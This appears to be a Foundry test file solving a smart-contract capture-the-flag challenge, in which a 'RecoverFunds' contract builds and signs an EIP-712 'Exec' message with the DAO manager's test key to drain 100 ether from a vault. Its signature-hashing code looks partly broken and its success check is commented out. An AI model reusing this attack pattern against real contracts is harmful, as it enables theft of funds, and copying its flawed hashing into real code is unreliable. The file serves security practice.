// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {DaoVaultImplementation, FactoryDao, IDaoVault} from "../src/7_crystalDAO/crystalDAO.sol";
import {Initializable} from "@openzeppelin-upgradeable/contracts/proxy/utils/Initializable.sol";
import {EIP712Upgradeable} from "@openzeppelin-upgradeable/contracts/utils/cryptography/EIP712Upgradeable.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/

contract RecoverFunds is Test ,Initializable, EIP712Upgradeable {
    address public owner;
    constructor() {
        // disable owner
        owner = msg.sender;
        _disableInitializers();
    }

    function initialize(address _owner) public initializer {
        // EIP712 init: name DaoWallet, version 1.0
        __EIP712_init("DaoWallet", "1.0");
        assembly {
            sstore(0, _owner)
        }
        
    }

    /**
     * @dev Returns the domain separator.
     * @return bytes32 Domain separator.
     */
    function getDomainSeparator() public view returns (bytes32) {
        return _domainSeparatorV4();
    }

    
    function execWithSignature(
        uint256 ownerPrivKey,
        address ownerAddress,
        address targetContractAddress
    ) external payable {

        address target=ownerAddress;
        uint val=100 ether;
        bytes memory execOrder="";
        uint deadline = 10000000000000;
        uint nonce=2;
        bytes32 structHash = keccak256(
            abi.encodePacked(
                keccak256(
                    "Exec(address target,uint256 value,bytes memory execOrder,uint256 nonce,uint256 deadline)"
                ),
                target,
                val,
                execOrder,
                nonce,
                deadline
            )
        );

        // Hash the struct and add EIP712 prefix
        bytes32 hash = _hashTypedDataV4(structHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPrivKey, hash);
        // Recover signer from signature
        address signer = ecrecover(hash, v, r, s);  
        require(ownerAddress == signer, "Not Signed successfully!");
        IDaoVault(targetContractAddress).execWithSignature(v, r, s, target, val, execOrder, deadline);


    }

    receive() external payable {
        // donations come here
    }
}


contract Challenge7Test is Test {
    FactoryDao factory;

    address public whitehat = makeAddr("whitehat");
    address public daoManager;
    uint256 daoManagerKey;

    IDaoVault vault;

    function setUp() public {
        (daoManager, daoManagerKey) = makeAddrAndKey("daoManager");
        factory = new FactoryDao();

        vm.prank(daoManager);
        vault = IDaoVault(factory.newWallet());

        // The vault has reached 100 ether in donations
        deal(address(vault), 100 ether);
    }

    function testHack() public {
        // console.log("this contract address is ",address(this))
        // vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge7Test -vvvv //
        ////////////////////////////////////////////////////*/
        RecoverFunds hero = new RecoverFunds();
        // hero.initialize(daoManager);
        
        hero.execWithSignature(daoManagerKey,daoManager,address(vault));

        //==================================================//
        // vm.stopPrank();

        // assertEq(
        //     daoManager.balance,
        //     100 ether,
        //     "The Dao manager's balance should be 100 ether"
        // );

    }
}
